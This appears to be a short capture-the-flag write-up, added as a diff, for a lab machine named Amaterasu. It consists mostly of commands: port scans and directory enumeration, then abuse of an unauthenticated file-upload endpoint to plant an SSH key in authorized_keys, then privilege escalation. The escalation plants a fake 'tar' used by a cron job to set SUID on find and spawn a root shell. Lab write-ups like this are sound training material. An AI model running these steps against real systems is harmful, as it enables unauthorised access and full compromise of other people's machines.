@@ -1,0 +1,58 @@
+192.168.x.x Amaterasu Writup
+
+Scan the Network
+nmap -p- --open --min-rate 500 -Pn -n 192.168.x.x
+nmap -p21,25022,33414,40080 -sVC -Pn -n 192.168.x.x
+
+Web Enumeration
+http://192.168.x.x:40080
+dirsearch -u "http://192.168.180.249:40080/"
+Check all directory (didn't find anything interesting
+
+http://192.168.x.x:33414
+dirsearch -u "http://192.168.180.249:33414/" -i 200,301 -t 20
+
+
+http://192.168.x.x:33414/help (Get some commands )
+http://192.168.x.x:33414/info (get username)
+
+Exploitation 
+Try to upload file (@ local filename)
+
+curl -X POST -F "file=@/home/vijay/Documents/test.txt" -F filename="/tmp/test.txt" http://192.168.x.x:33414/file-upload
+
+Check file uploaded or not
+http://192.168.x.x:33414/file-list?dir=/home
+to find username
+http://192.168.x.x:33414/file-list?dir=/tmp
+
+ssh-keygen
+sudo chmod 600 id_rsa
+sudo cp id_rsa.pub id_rsa.pub.txt
+
+curl -F filename="/home/alfredo/.ssh/authorized_keys" -F file=@id_rsa.pub.txt http://192.168.x.x:33414/file-upload
+ssh -p 25022 -i id_rsa alfredo@192.168.x.x
+
+
+
+Privilege Escalation
+find / -perm -u=s 2>/dev/null
+Not interested findings
+
+
+cat /etc/crontab
+cat cat /usr/local/bin/backup-flask.sh 
+ls restapi/
+cd restapi/
+nano tar 
+#/bin/bash
+chmod u+s /usr/bin/find
+
+chmod +x tar
+find / -perm -u=s -type f 2>/dev/null
+/usr//bin/find . -exec /bin/sh -p \; -quit
+whoami
+id 
+cat /root/proof.txt
+
+
